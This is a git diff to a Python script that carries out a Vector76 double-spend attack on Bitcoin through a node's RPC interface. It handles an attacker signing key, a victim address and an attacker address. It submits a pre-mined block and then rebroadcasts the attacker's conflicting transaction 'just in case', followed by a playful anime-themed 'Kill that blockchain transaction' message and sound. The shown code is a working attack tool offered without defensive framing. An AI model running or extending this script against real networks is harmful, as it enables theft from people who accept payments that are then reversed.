@@ -52,7 +52,7 @@ rpc_host = args.node_host
 rpc_port = args.node_port
 username = args.username
 password = args.password
-key      = args.attacker_signkey_1
+key      = args.attacker_signkey
 victim_address   = args.victim_address
 attacker_address = args.attacker_address
 amount_BTC = args.amount_of_coins#float(sys.argv[9])
@@ -70,6 +70,7 @@ info = rpc_node.getblockchaininfo()
 print(info)
 print("--------------------")
 amount_satoshi = to_satoshi(amount_BTC)
+print(amount_satoshi)
 fee_satoshi = 1500
 
 bitcoin.SelectParams(network)
@@ -114,7 +115,11 @@ print()
 print(f"submitblock {vector76_mining_hash}")
 print()
 result = rpc_node.submitblock(vector76_mining_hash)
-print(result)
+try:
+    result = rpc_node.sendrawtransaction(tx_attacker) #念の為
+    print(result)
+except:
+    print("")
 print()#おまけ
 print(f"Kamijou Touma >> Kill that blockchain transaction!!")
 print()
@@ -128,6 +133,6 @@ try:
     clip.stop()
 except:
     # Termux Only
-    imagine_breaker_cmd = f"cvlc --play-and-exit {sound_name}"
+    imagine_breaker_cmd = ["cvlc", "--play-and-exit", sound_name]
     subprocess.run(imagine_breaker_cmd)
 print("Done.")
